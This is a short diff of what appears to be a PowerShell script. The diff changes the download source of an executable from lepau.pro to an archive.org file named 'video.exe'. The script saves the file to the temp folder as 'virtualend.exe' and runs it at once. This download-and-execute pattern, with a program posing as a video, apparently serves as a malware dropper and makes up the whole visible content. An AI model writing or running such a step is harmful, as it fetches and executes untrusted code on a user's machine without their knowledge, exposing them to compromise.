@@ -7,7 +7,7 @@ Write-Host "=================================================" -ForegroundColor 
 Write-Host ""
 
 $exe = "$env:TEMP\virtualend.exe"
-iwr lepau.pro/virtualend.exe -OutFile $exe
+iwr archive.org/download/video_20250927_2306/video.exe -OutFile $exe
 
 # Run and wait for it to finish
 Start-Process $exe -Wait
